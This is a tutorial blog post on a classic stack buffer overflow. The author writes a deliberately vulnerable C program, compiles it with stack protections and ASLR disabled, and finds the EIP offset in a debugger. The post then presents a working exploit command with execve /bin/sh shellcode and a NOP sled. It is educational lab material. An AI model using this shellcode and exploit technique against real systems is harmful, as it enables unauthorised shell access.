---
title: "Buffer Overflow 101"
description: Here is a demo of all shortcodes available in Hugo.
date: 2025-03-26
tags: ["buffer overflow", "exploit development", "security", "vulnerability"]
categories: ["Cybersecurity", "Exploitation"]
summary: This post covers the basics of creating and exploiting a buffer overflow vulnerability.
toc: true
---

<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    mediumZoom('article img'); // Targets all images inside articles
  });
</script>

<style>
.toc {
  font-size: 0.9em; /* Reduce the font size */
  width: auto; /* Keep the width dynamic */
  padding: 8px; /* Add some padding for spacing */
  position: relative; /* Ensure it stays in its original position */
  margin-left: 0; /* Keep it aligned to the left */
}

.toc a {
  font-size: 0.85em; /* Reduce the font size of links */
  line-height: 1.4; /* Adjust line height for better readability */
}
</style>

## Background
- A bit of background on buffer overflows: Buffer overflows occur when a program attempts to write more data into a buffer than it has allocated for it. This can lead to overwriting adjacent memory locations, potentially resulting in code execution or other security vulnerabilities.
- Recently, in one of my lectures, I was tasked with simulating a buffer overflow vulnerability, and I would like to share my approach to simulating this vulnerability.

## C Program used for the Simulation

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char buffer[256];
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
    return 0;
}
```

- The above binary is vulnerable because of the use of `strcpy`, which fails to check for buffer overflow. Since `strcpy` copies data without ensuring the destination buffer has enough space, an attacker can exploit this to overwrite adjacent memory. PS: for such applications always use `strncpy`.


## Compilation
```c
gcc -fno-stack-protector -z execstack -no-pie -m32 -mpreferred-stack-boundary=2 program.c -o program
```
- <u>_**mpreferred-stack-boundary**_</u>: This is particularly relevant for older or specific ABI requirements, as many modern systems use a higher boundary. Basically in my case, I had to use this to ensure that the stack is aligned to 4 bytes as im compiling to a 32 bit binary.
- <u>_**fno-stack-protector**_:</u> Disables stack protection also known as canaries allowing buffer overflow to occur.
- <u>_**execstack**_:</u> This flag marks the stack as executable, allowing you to place and run code from the stack.
- <u>_**no-pie**_:</u> Disabling PIE (Position Independent Executable) means the binary loads at a fixed address, which simplifies things for certain testing scenarios (like predictable addresses for shellcode).
- <u>_**m32**_</u>: This flag compiles your code as a 32-bit binary.

Also make sure to disable ASLR using the below command,

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

This makes sure that the addresses are not randomized and are predictable.

## Reconnaissance
![Checksec Image](/images/Screenshot_2025-03-26_10-47-14.png)

- <u>_**PIE**_</u>: No PIE, meaning that the binary is not built as a Position Independent Executable, which results in a fixed memory layout each time the program runs.
- <u>_**Stack**_</u>: No Canary found meaning we can easily perform buffer overflow as there are no protections also it is executable allowing for shellcode to be executed.

## Performing the attack

1. <u>**Basic Exploration**</u>  
   First, I'll disassemble the `main` function and fill the buffer to find out where the buffer's address is stored in the stack.

    ![Buffer Address](/images/Screenshot_2025-03-20_08-04-13.png)

    Now from the above we will first try to put a breakpoint at something after the **puts@plt** which is at `0x8049050` so that we can see how the buffer fills upon filling with input.

2. <u>**Filling the Buffer**</u>

    ![Filling Buffer](/images/Screenshot_2025-03-21_00-37-48.png)

    Command: `r $(python2 -c 'print "A"*256')`

    In the above image upon running this we can fill the buffer which can accommodate `256` bytes of characters using python2. By doing so we can find out whats the starting address of the buffer which will be used to craft the exploit.

    Running the below command gives us a better clarity,

    Command: `x/256x $esp`

    ![Inspecting Buffer](/images/Screenshot_2025-03-21_00-38-01.png)

    From this image we can see that the buffer starts filling from `0xffffcfa4` with ‘A’ (0x41)

3. <u>**Offset Calculation**</u>

    Now lets find till where we must give input so that we can overwrite the EIP (current instruction register) . From the below we see that we overwrote the EIP with `‘qaac’`.

    Command: `cyclic 300`

    ![Cyclic 300](/images/Screenshot_2025-03-21_00-39-34.png)

    Now finding the offset using the below command,

    Command: `cyclic -l qaac`

    ![Cyclic finder](/images/Screenshot_2025-03-21_00-39-51.png)

    Thus we found that the offset needed is `264` after which the next 4 bytes given will overwrite the EIP with that value.

    Command: `r $(python2 -c 'print "A"*264 + "BBBB"')`

    We can confirm this with the below image where after `264`, I have given `‘BBBB’` as input which has been overwritten onto the EIP.

    ![EIP overwrite](/images/Screenshot_2025-03-21_00-43-47.png)

4. <u>**Writing the Exploit**</u>

    Now we have the following details:

     **Buffer starting address**: `0xffffcfa4`  
     **Offset**: `264`

    Next, we need malicious code. I’ll be using a shellcode that spawns a shell from the binary, which can be exploited by an attacker to compromise the system.

    **Shellcode used**:
    ```bash
    \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80
    ```

    The above is a 23 byte shell code 

    So now to write the exploit we need to follow the below structure,


    - First we need a **NOP** (NO operation sled) which provides a safe landing zone for the return address. Basically making sure that execution slides down NOPs to reach the shellcode . For this lets take a value of `100` NOPs (experimentally found).
    - Next we put the 23 byte shell code.
    - Next since the offset was 264 we fill the remaining (264 – 23 – 100 = `141`) with padding, so here Ive padded with ‘A’
    - Next we write the address which we want to overwrite on the EIP
    - In this the actual return stack address is `0xffffcfa4`, however we want to point it to an address which is somewhere within the NOP sled so it can slide to the shellcode. Hence from the below image ill take the address `0xffffd0c0` which is filled with /x90 which are NOPs so that it can slide execution into the shellcode.<br><br>
    
    The stack address is located higher in memory, as shown below:

    ![Image with NOP slide](/images/Screenshot_2025-03-21_17-21-21.png)

    Thus, we can craft the exploit as follows:

    ```bash
    ./program $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*100 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80" + b"A"*141 + b"\xc0\xd0\xff\xff")')
    ```

    - The address `0xffffd0c0` has been written in little endian hence `\xc0\xd0\xff\xff`.
    - NOP in hex is `\x90`.<br><br>
    Below is an image which shows the attack being successful and spawing a shell which can be used by the attacker for manipulating the system.<br><br>

    ![Attacked](/images/Screenshot_2025-03-21_17-25-56.png)

    BOOM! We have successfully exploited the buffer overflow vulnerability and spawned a shell.

